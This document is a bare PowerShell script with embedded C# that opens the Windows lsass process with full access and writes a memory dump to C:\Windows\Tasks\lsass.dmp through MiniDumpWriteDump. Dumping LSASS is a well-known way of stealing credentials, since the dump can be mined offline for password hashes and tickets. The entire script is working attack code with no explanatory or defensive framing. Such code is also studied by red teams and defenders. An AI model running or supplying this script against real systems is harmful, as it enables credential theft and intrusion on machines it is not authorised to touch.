Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public static class DumpLsass {
    [DllImport("Dbghelp.dll")]
        public static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            int ProcessId,
            IntPtr hFile, 
            int DumpType, 
            IntPtr ExceptionParam,
            IntPtr UserStreamParam, 
            IntPtr CallbackParam);

    [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            uint processAccess, 
            bool bInheritHandle,
            int processId);
}
"@

$dumpLocation = "C:\Windows\Tasks\lsass.dmp";
$lsassProcess = [System.Diagnostics.Process]::GetProcessesByName("lsass");
$lsassProcessID = $lsassProcess.Id;
[IntPtr] $lsassHandle = [DumpLsass]::OpenProcess("0x001F0FF", "false", $lsassProcessID);
$fileStream = [System.IO.File]::Create($dumpLocation);
[bool] $dumped = [DumpLsass]::MiniDumpWriteDump($lsassHandle, $lsassProcessID, $fileStream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);
$fileStream.Close();
$dumped
